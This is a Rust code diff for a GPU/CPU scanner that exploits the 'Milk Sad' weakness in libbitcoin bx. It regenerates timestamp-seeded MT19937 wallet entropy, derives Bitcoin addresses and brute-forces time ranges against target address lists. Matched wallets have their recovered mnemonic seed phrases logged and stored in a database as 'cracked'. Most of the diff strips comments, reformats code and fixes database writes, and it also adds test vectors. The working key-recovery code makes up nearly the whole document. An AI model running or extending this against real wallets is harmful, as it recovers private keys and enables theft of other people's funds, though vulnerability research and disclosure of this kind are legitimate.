@@ -113,7 +113,7 @@ pub const MILK_SAD_FULL_END: u32 = 1704067199; // 2023-12-31
 /// Unified Milk Sad Scanner Entry Point
 pub fn run_scan(
     target: Option<String>,
-    target_file: Option<PathBuf>,  // ← файл со списком адресов
+    target_file: Option<PathBuf>,
     start_ts_opt: Option<u32>,
     end_ts_opt: Option<u32>,
     multipath: bool,
@@ -140,7 +140,6 @@ pub fn run_scan(
         None
     };
 
-    // Если передан файл — запускаем пакетный GPU-скан по всем адресам сразу
     if let Some(ref path) = target_file {
         let addresses = load_addresses_from_file(path)?;
         info!("Loaded {} target addresses from {:?}", addresses.len(), path);
@@ -167,7 +166,6 @@ fn run_with_target(
     entropy_size: EntropySize,
     db_path: Option<PathBuf>,
 ) -> Result<()> {
-    // Parse address and identify type/purpose
     let address = Address::from_str(target)?.assume_checked();
     let script = address.script_pubkey();
 
@@ -186,7 +184,6 @@ fn run_with_target(
 
     let purpose = addr_type.purpose();
 
-    // Initialize database if path provided
     let db = if let Some(ref path) = db_path {
         Some(TargetDatabase::new(path.clone())?)
     } else {
@@ -203,7 +200,6 @@ fn run_with_target(
         }
         info!("Target Address: {}", target);
         info!("Target Hash160: {}", hex::encode(&target_hash160));
-
         info!(
             "Scanning timestamps {} to {} ({} seconds)...",
             start_ts,
@@ -228,7 +224,6 @@ fn run_with_target(
                     results.len()
                 );
                 for (timestamp, addr_idx) in results {
-                    // CPU verification uses the same entropy size as the GPU kernel
                     let entropy = generate_entropy_msb(timestamp, entropy_size);
                     let derived_address =
                         generate_address_from_entropy_vec(&entropy, addr_idx, addr_type, false);
@@ -260,8 +255,13 @@ fn run_with_target(
                 info!("\nScan complete. No match found.");
             }
         } else {
-            let results =
-                solver.compute_milk_sad_crack(start_ts, end_ts, &target_hash160, purpose, entropy_size.bit_count())?;
+            let results = solver.compute_milk_sad_crack(
+                start_ts,
+                end_ts,
+                &target_hash160,
+                purpose,
+                entropy_size.bit_count(),
+            )?;
             if !results.is_empty() {
                 info!(
                     "\n[GPU] Found {} potential candidates. Verifying...",
@@ -278,7 +278,9 @@ fn run_with_target(
                             info!("Timestamp: {}, Entropy Size: {:?}", timestamp, size);
                             info!("Mnemonic: {}", Mnemonic::from_entropy(&entropy)?);
 
-							#[cfg(not(feature = "gpu"))]
+                            // FIX: removed #[cfg(not(feature = "gpu"))] — db write must run
+                            // inside this GPU-enabled block, not be gated out by the
+                            // inverted feature flag.
                             if let Some(ref d) = db {
                                 d.upsert_target(&Target {
                                     address: target.to_string(),
@@ -367,7 +369,6 @@ fn run_cpu_target_scan(
                                 warn!("Mnemonic: {}", mnemonic);
                             }
 
-							#[cfg(not(feature = "gpu"))]
                             if let Some(ref d) = db {
                                 d.upsert_target(&Target {
                                     address: target.to_string(),
@@ -448,9 +449,7 @@ fn run_rpc_scan(
             let entropy = generate_entropy_msb(t, entropy_size);
 
             for &addr_type in &address_types {
-                // Check external (0) and internal/change (1) chains
                 for change in [false, true] {
-                    // Only check index 0 by default to save time, unless multipath
                     let limit = if multipath { 30 } else { 1 };
 
                     for i in 0..limit {
@@ -484,7 +483,8 @@ fn run_rpc_scan(
                                             warn!("Mnemonic: {}", mnemonic);
                                         }
 
-										#[cfg(not(feature = "gpu"))]
+                                        // FIX: removed #[cfg(not(feature = "gpu"))] — this
+                                        // function is not GPU-gated and must always write to DB.
                                         if let Some(ref d) = db {
                                             d.upsert_target(&Target {
                                                 address: address_str,
@@ -515,7 +515,9 @@ fn run_rpc_scan(
             }
         }
 
-        if (t - start_ts).is_multiple_of(1000) && t > start_ts {
+        // FIX: is_multiple_of() is nightly-only (tracking issue #102842).
+        // Use % operator instead for stable toolchain compatibility.
+        if (t - start_ts) % 1000 == 0 && t > start_ts {
             let elapsed = start_time.elapsed().as_secs_f64();
             let speed = checked as f64 / elapsed;
             info!(
@@ -575,9 +577,6 @@ fn parse_address_to_hash160(addr: &str) -> Option<([u8; 20], AddressType)> {
 }
 
 /// GPU scan against a list of target addresses loaded from file.
-///
-/// Strategy: scan all timestamps, for each hit check which address matched on CPU.
-/// The GPU kernel receives a flat buffer of Hash160s and returns (timestamp, addr_idx, target_idx).
 #[cfg(feature = "gpu")]
 fn run_with_target_file(
     addresses: Vec<String>,
@@ -587,7 +586,6 @@ fn run_with_target_file(
     entropy_size: EntropySize,
     db_path: Option<PathBuf>,
 ) -> Result<()> {
-    // Parse all addresses into Hash160 + type
     let mut parsed: Vec<([u8; 20], AddressType, String)> = Vec::new();
     let mut skipped = 0usize;
     for addr in &addresses {
@@ -601,11 +599,11 @@ fn run_with_target_file(
     if parsed.is_empty() {
         return Err(anyhow::anyhow!("No supported addresses (P2PKH/P2SH/P2WPKH) found in file"));
     }
-    info!("Scanning {} addresses ({} skipped) | {} to {} | {:?} entropy",
-        parsed.len(), skipped, start_ts, end_ts, entropy_size);
+    info!(
+        "Scanning {} addresses ({} skipped) | {} to {} | {:?} entropy",
+        parsed.len(), skipped, start_ts, end_ts, entropy_size
+    );
 
-    // Flatten Hash160s into a single buffer for the GPU
-    // All P2SH targets together — purpose is encoded per target
     let flat_h160: Vec<u8> = parsed.iter().flat_map(|(h, _, _)| h.iter().copied()).collect();
     let purposes: Vec<u32> = parsed.iter().map(|(_, t, _)| t.purpose()).collect();
 
@@ -627,11 +625,14 @@ fn run_with_target_file(
         multipath,
     )?;
 
-    info!("GPU scan done in {:.2}s. Candidates: {}", start_time.elapsed().as_secs_f64(), results.len());
+    info!(
+        "GPU scan done in {:.2}s. Candidates: {}",
+        start_time.elapsed().as_secs_f64(),
+        results.len()
+    );
 
     for (timestamp, addr_idx, target_idx) in results {
         let (_, addr_type, orig_addr) = &parsed[target_idx as usize];
-        // CPU verification
         let entropy = generate_entropy_msb(timestamp, entropy_size);
         let derived = generate_address_from_entropy_vec(&entropy, addr_idx, *addr_type, false);
         if &derived == orig_addr {
@@ -642,7 +643,14 @@ fn run_with_target_file(
                     address: orig_addr.clone(),
                     vuln_class: "milk_sad".to_string(),
                     first_seen_timestamp: Some(timestamp as i64),
-                    metadata_json: Some(serde_json::json!({"entropy": hex::encode(&entropy), "size": format!("{:?}", entropy_size), "index": addr_idx}).to_string()),
+                    metadata_json: Some(
+                        serde_json::json!({
+                            "entropy": hex::encode(&entropy),
+                            "size": format!("{:?}", entropy_size),
+                            "index": addr_idx
+                        })
+                        .to_string(),
+                    ),
                     status: "cracked".to_string(),
                     ..Default::default()
                 })?;
@@ -662,7 +670,11 @@ fn run_with_target_file(
     db_path: Option<PathBuf>,
 ) -> Result<()> {
     warn!("GPU feature disabled. Running CPU fallback for {} addresses.", addresses.len());
-    let db = if let Some(ref path) = db_path { Some(TargetDatabase::new(path.clone())?) } else { None };
+    let db = if let Some(ref path) = db_path {
+        Some(TargetDatabase::new(path.clone())?)
+    } else {
+        None
+    };
     let start_time = std::time::Instant::now();
     let mut checked = 0u64;
     let addr_limit = if multipath { 30 } else { 1 };
@@ -672,7 +684,8 @@ fn run_with_target_file(
         for addr_str in &addresses {
             if let Some((_, addr_type)) = parse_address_to_hash160(addr_str) {
                 for addr_idx in 0..addr_limit {
-                    let derived = generate_address_from_entropy_vec(&entropy, addr_idx, addr_type, false);
+                    let derived =
+                        generate_address_from_entropy_vec(&entropy, addr_idx, addr_type, false);
                     checked += 1;
                     if &derived == addr_str {
                         info!("🔓 MATCH! {} | ts={} idx={}", addr_str, ts, addr_idx);
@@ -683,7 +696,10 @@ fn run_with_target_file(
                                 address: addr_str.clone(),
                                 vuln_class: "milk_sad".to_string(),
                                 first_seen_timestamp: Some(ts as i64),
-                                metadata_json: Some(serde_json::json!({"entropy": hex::encode(&entropy)}).to_string()),
+                                metadata_json: Some(
+                                    serde_json::json!({"entropy": hex::encode(&entropy)})
+                                        .to_string(),
+                                ),
                                 status: "cracked".to_string(),
                                 ..Default::default()
                             })?;
@@ -709,21 +725,16 @@ fn run_with_target_file(
 /// bx takes only the MOST SIGNIFICANT BYTE from each 32-bit MT19937 output,
 /// throwing away the other 3 bytes. This means:
 /// - 128-bit entropy requires 16 MT19937 outputs
-/// - 192-bit entropy requires 24 MT19937 outputs  
+/// - 192-bit entropy requires 24 MT19937 outputs
 /// - 256-bit entropy requires 32 MT19937 outputs
 pub fn generate_entropy_msb(timestamp: u32, size: EntropySize) -> Vec<u8> {
     let byte_len = size.byte_len();
-
     let mut rng = Mt19937GenRand32::new(timestamp);
     let mut entropy = vec![0u8; byte_len];
-
-    // Each entropy byte comes from the MSB of a separate MT19937 output
     for byte in entropy.iter_mut().take(byte_len) {
         let val = rng.next_u32();
-        // MSB extraction: take ONLY bits 31:24 (most significant byte)
         *byte = ((val >> 24) & 0xFF) as u8;
     }
-
     entropy
 }
 
@@ -736,7 +747,6 @@ pub fn generate_milk_sad_entropy(timestamp: u32) -> [u8; 16] {
     arr
 }
 
-// Non-GPU version for RPC scan
 #[cfg(not(feature = "gpu"))]
 #[allow(dead_code)]
 fn generate_milk_sad_entropy(timestamp: u32) -> [u8; 16] {
@@ -775,7 +785,6 @@ pub fn generate_address_from_entropy_vec(
         Err(_) => return String::new(),
     };
 
-    // Build derivation path: m/purpose'/coin'/account'/change/index
     let purpose = addr_type.purpose();
     let change_idx = if change { 1 } else { 0 };
     let path_str = format!("m/{}'/{}'/{}'/{}/{}", purpose, 0, 0, change_idx, addr_index);
@@ -793,23 +802,19 @@ pub fn generate_address_from_entropy_vec(
     let private_key = bitcoin::PrivateKey::new(derived.private_key, network);
     let pubkey = private_key.public_key(&secp);
 
-    // Generate address based on type
     match addr_type {
         AddressType::P2PKH => Address::p2pkh(pubkey, network).to_string(),
         AddressType::P2SHWPKH => {
-            // P2SH-wrapped SegWit (BIP49) - prefix "3"
             let compressed = CompressedPublicKey(pubkey.inner);
             Address::p2shwpkh(&compressed, network).to_string()
         }
         AddressType::P2WPKH => {
-            // Native SegWit (BIP84) - prefix "bc1q"
             let compressed = CompressedPublicKey(pubkey.inner);
             Address::p2wpkh(&compressed, network).to_string()
         }
     }
 }
 
-/// Legacy function for GPU compatibility
 #[cfg(feature = "gpu")]
 #[allow(dead_code)]
 fn generate_address_from_entropy(entropy: &[u8; 16], addr_index: u32) -> String {
@@ -826,10 +831,8 @@ mod tests {
 
     #[test]
     fn test_entropy_generation_128bit() {
-        // Timestamp 0 should produce "milk sad wage cup..." mnemonic
         let entropy = generate_entropy_msb(0, EntropySize::Bits128);
         assert_eq!(entropy.len(), 16);
-
         let mnemonic = Mnemonic::from_entropy(&entropy).unwrap();
         let words: Vec<&str> = mnemonic.words().collect();
         assert_eq!(words[0], "milk");
@@ -840,7 +843,6 @@ mod tests {
     fn test_entropy_generation_192bit() {
         let entropy = generate_entropy_msb(0, EntropySize::Bits192);
         assert_eq!(entropy.len(), 24);
-
         let mnemonic = Mnemonic::from_entropy(&entropy).unwrap();
         assert_eq!(mnemonic.word_count(), 18);
     }
@@ -849,7 +851,6 @@ mod tests {
     fn test_entropy_generation_256bit() {
         let entropy = generate_entropy_msb(0, EntropySize::Bits256);
         assert_eq!(entropy.len(), 32);
-
         let mnemonic = Mnemonic::from_entropy(&entropy).unwrap();
         assert_eq!(mnemonic.word_count(), 24);
     }
@@ -858,120 +859,117 @@ mod tests {
     fn test_address_types() {
         let entropy = generate_entropy_msb(0, EntropySize::Bits128);
 
-        // BIP44 - Legacy P2PKH (prefix 1)
         let p2pkh = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2PKH, false);
-        assert!(
-            p2pkh.starts_with('1'),
-            "P2PKH should start with 1, got: {}",
-            p2pkh
-        );
+        assert!(p2pkh.starts_with('1'), "P2PKH should start with 1, got: {}", p2pkh);
 
-        // BIP49 - SegWit-compatible P2SH (prefix 3)
         let p2shwpkh = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2SHWPKH, false);
-        assert!(
-            p2shwpkh.starts_with('3'),
-            "P2SHWPKH should start with 3, got: {}",
-            p2shwpkh
-        );
+        assert!(p2shwpkh.starts_with('3'), "P2SHWPKH should start with 3, got: {}", p2shwpkh);
 
-        // BIP84 - Native SegWit (prefix bc1q)
         let p2wpkh = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2WPKH, false);
-        assert!(
-            p2wpkh.starts_with("bc1q"),
-            "P2WPKH should start with bc1q, got: {}",
-            p2wpkh
-        );
+        assert!(p2wpkh.starts_with("bc1q"), "P2WPKH should start with bc1q, got: {}", p2wpkh);
     }
 
     #[test]
     fn test_change_addresses() {
         let entropy = generate_entropy_msb(12345, EntropySize::Bits128);
-
         let external = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2PKH, false);
         let internal = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2PKH, true);
-
-        // External and internal addresses should be different
         assert_ne!(external, internal);
     }
 
-    /// CRITICAL: Validate implementation produces correct 'milk sad' mnemonic for timestamp 0
-    /// This is the canonical test case from the Milk Sad vulnerability disclosure
+    /// CRITICAL: Validate implementation produces correct 'milk sad' mnemonic for timestamp 0.
+    /// This is the canonical test case from the Milk Sad vulnerability disclosure.
     #[test]
     fn test_validate_milk_sad_mnemonic() {
-        // Timestamp 0 with 256-bit entropy MUST produce "milk sad wage cup..." mnemonic
-        // This is THE defining test for libbitcoin/bx vulnerability
         let entropy_ts0 = generate_entropy_msb(0, EntropySize::Bits256);
         let mnemonic = Mnemonic::from_entropy(&entropy_ts0).unwrap();
         let words: Vec<&str> = mnemonic.words().collect();
+        assert_eq!(words[0], "milk",  "First word must be 'milk' for timestamp 0");
+        assert_eq!(words[1], "sad",   "Second word must be 'sad' for timestamp 0");
+        assert_eq!(words[2], "wage",  "Third word must be 'wage' for timestamp 0");
+        assert_eq!(words[3], "cup",   "Fourth word must be 'cup' for timestamp 0");
 
-        assert_eq!(
-            words[0], "milk",
-            "First word must be 'milk' for timestamp 0"
-        );
-        assert_eq!(words[1], "sad", "Second word must be 'sad' for timestamp 0");
-        assert_eq!(
-            words[2], "wage",
-            "Third word must be 'wage' for timestamp 0"
-        );
-        assert_eq!(words[3], "cup", "Fourth word must be 'cup' for timestamp 0");
-
-        // Also validate 128-bit entropy (12 words) produces valid mnemonic
         let entropy_128 = generate_entropy_msb(0, EntropySize::Bits128);
         let mnemonic_128 = Mnemonic::from_entropy(&entropy_128).unwrap();
         assert_eq!(mnemonic_128.word_count(), 12);
-
-        // The 12-word version also starts with "milk sad" for timestamp 0
         let words_128: Vec<&str> = mnemonic_128.words().collect();
         assert_eq!(words_128[0], "milk", "128-bit: First word must be 'milk'");
-        assert_eq!(words_128[1], "sad", "128-bit: Second word must be 'sad'");
+        assert_eq!(words_128[1], "sad",  "128-bit: Second word must be 'sad'");
     }
 
-    /// Test Research Update #13 time range constants
     #[test]
     fn test_update_13_time_constants() {
-        // Verify 2018 time range
-        assert_eq!(UPDATE_13_START_TIMESTAMP, 1514764800); // 2018-01-01 00:00:00 UTC
-        assert_eq!(UPDATE_13_END_TIMESTAMP, 1546300799); // 2018-12-31 23:59:59 UTC
+        assert_eq!(UPDATE_13_START_TIMESTAMP, 1514764800);
+        assert_eq!(UPDATE_13_END_TIMESTAMP,   1546300799);
 
-        // Verify full range (compile-time constant checks for documentation)
         #[allow(clippy::assertions_on_constants)]
         {
             assert!(MILK_SAD_FULL_START < UPDATE_13_START_TIMESTAMP);
             assert!(UPDATE_13_END_TIMESTAMP < MILK_SAD_FULL_END);
         }
 
-        // Verify one full year
         let year_in_seconds = 365 * 24 * 60 * 60;
         let range = UPDATE_13_END_TIMESTAMP - UPDATE_13_START_TIMESTAMP + 1;
         assert_eq!(range, year_in_seconds, "Should be exactly one year");
     }
 
-    /// Test Update #13 specific requirements: 24-word + BIP49
     #[test]
     fn test_update_13_wallet_generation() {
-        // Generate wallet with Update #13 characteristics
-        let timestamp = 1520000000u32; // Mid-2018
+        let timestamp = 1520000000u32;
         let entropy = generate_entropy_msb(timestamp, EntropySize::Bits256);
-
-        // Should be 32 bytes for 256-bit
         assert_eq!(entropy.len(), 32);
 
-        // Generate BIP49 address
         let address = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2SHWPKH, false);
-
-        // Should be P2SH-SegWit (prefix '3')
         assert!(
             address.starts_with('3'),
             "Update #13 addresses should start with '3', got: {}",
             address
         );
 
-        // Verify mnemonic is 24 words
         let mnemonic = Mnemonic::from_entropy(&entropy).unwrap();
-        assert_eq!(
-            mnemonic.word_count(),
-            24,
-            "Update #13 uses 24-word mnemonics"
-        );
+        assert_eq!(mnemonic.word_count(), 24, "Update #13 uses 24-word mnemonics");
+    }
+
+    /// GPU test-vector validation: entropy must match generate_test_vectors.exe output
+    ///
+    /// These vectors verify that generate_entropy_msb (CPU reference) and the GPU
+    /// kernel produce byte-identical output for the same seed.
+    /// Run: cargo test test_gpu_test_vectors -- --nocapture
+    #[test]
+    fn test_gpu_test_vectors_entropy() {
+        let cases: &[(u32, &str)] = &[
+            (1234567890, "9e695582572b97ff9774a5662626e42fe380c48c3b810f33e4437d216e8b2bab"),
+            (1609459200, "49a76eebefb9198533904d82d223070282a8577002b3f5313907ea007474db6c"),
+            (1577836800, "f4d5c22a415a49a59d8438e5e465cfa83afa4891d1125982a5f90760622ddf7c"),
+            (1293840000, "d5a3f4fd55b0da220673a7496fc717e8e8cba8bde4b35da76d53d6b061694663"),
+            (1690848000, "3685466a59c974bb71a0f55a7bf6e617c424df5b4ecadb5893215f392de67b90"),
+        ];
+        for &(ts, expected_hex) in cases {
+            let entropy = generate_entropy_msb(ts, EntropySize::Bits256);
+            assert_eq!(
+                hex::encode(&entropy), expected_hex,
+                "Entropy mismatch for timestamp {}", ts
+            );
+        }
+    }
+
+    /// GPU test-vector validation: addresses must match generate_test_vectors.exe output
+    #[test]
+    fn test_gpu_test_vectors_addresses() {
+        let cases: &[(u32, &str)] = &[
+            (1234567890, "1A9phL1z5F7htnhu2xSBoKjGBDsERrG8TC"),
+            (1609459200, "1BbgkqwUi8swxftrjdQTBPxvF96kW7EhJr"),
+            (1577836800, "1FbGfRXFTGL4njQWEPxB3cXr55jMktLXpZ"),
+            (1293840000, "1AErapuCTq5WVHZKBmM4g1QBDTbUMqP2ZJ"),
+            (1690848000, "13XH2bH8roca4VbAMTuLait6ky4z3W4Rnm"),
+        ];
+        for &(ts, expected_addr) in cases {
+            let entropy = generate_entropy_msb(ts, EntropySize::Bits256);
+            let addr = generate_address_from_entropy_vec(&entropy, 0, AddressType::P2PKH, false);
+            assert_eq!(
+                addr, expected_addr,
+                "Address mismatch for timestamp {}", ts
+            );
+        }
     }
 }
